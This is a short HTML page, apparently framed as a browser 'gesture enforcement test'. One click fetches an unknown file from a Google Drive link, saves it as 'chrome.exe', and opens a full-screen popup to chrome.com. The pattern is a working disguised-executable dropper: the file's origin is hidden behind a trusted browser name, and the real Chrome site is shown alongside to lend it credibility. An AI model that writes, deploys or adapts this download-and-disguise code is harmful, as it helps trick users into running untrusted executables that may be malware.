<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Gesture Test</title>
<style>
body { font-family:sans-serif;padding:20px }
button { padding:12px 18px;font-size:16px }
pre { background:#111;color:#0f0;padding:10px }
</style>
</head>
<body>

<h3>Popup Download Gesture Enforcement Test</h3>
<button id="btn">Open Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = async () => {

  log("[1] User click received");

  const fileUrl = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";

  try {

    log("[2] Fetching file...");

    const response = await fetch(fileUrl);
    const blob = await response.blob();

    log("[3] File received");

    const a = document.createElement("a");
    const url = URL.createObjectURL(blob);

    a.href = url;
    a.download = "chrome.exe";   // nama file yang disimpan
    document.body.appendChild(a);
    a.click();

    URL.revokeObjectURL(url);

    log("[4] Download triggered");

  } catch(e) {
    log("[ERROR] " + e);
  }

  // popup test
  const w = window.open(
    "https://chrome.com",
    "_blank",
    `
    width=${screen.availWidth},
    height=${screen.availHeight},
    left=0,
    top=0
    `
  );

  if(!w){
    log("[ERROR] Popup blocked");
  } else {
    log("[5] Popup opened");
  }

};
</script>

</body>
</html>
